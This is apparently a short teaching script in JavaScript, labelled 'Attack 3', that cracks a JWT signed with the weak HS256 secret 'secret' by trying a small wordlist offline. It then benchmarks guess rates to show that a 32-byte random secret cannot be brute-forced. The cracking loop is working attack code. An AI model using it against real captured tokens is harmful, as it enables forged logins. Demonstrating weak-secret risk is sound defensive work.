// Attack 3: offline brute force of a weak HS256 secret from ONE captured token
import { createHmac, randomBytes } from 'node:crypto';
import { SignJWT } from 'jose';

const weak = 'secret'; // pretend this is the server's secret
const token = await new SignJWT({ role: 'user' }).setProtectedHeader({ alg: 'HS256' })
  .setExpirationTime('5m').sign(new TextEncoder().encode(weak));
const [h, p, s] = token.split('.');

const wordlist = ['123456', 'password', 'admin', 'letmein', 'qwerty', 'jwt', 'changeme', 'secret', 'hunter2'];
const t0 = performance.now();
let found = null;
for (const cand of wordlist) {
  if (createHmac('sha256', cand).update(`${h}.${p}`).digest('base64url') === s) { found = cand; break; }
}
console.log(found ? `CRACKED secret = "${found}"` : 'not found', `in ${(performance.now() - t0).toFixed(2)} ms`);

// How fast can this machine test candidates?
const N = 300_000;
const t1 = performance.now();
for (let i = 0; i < N; i++) createHmac('sha256', 'k' + i).update(`${h}.${p}`).digest();
const rate = N / ((performance.now() - t1) / 1000);
console.log(`~${Math.round(rate).toLocaleString()} guesses/sec on one core`);
const years = 2 ** 256 / rate / 3.15e7;
console.log(`32 random bytes: 2^256 keyspace -> ~${years.toExponential(1)} years on this core (infeasible)`);
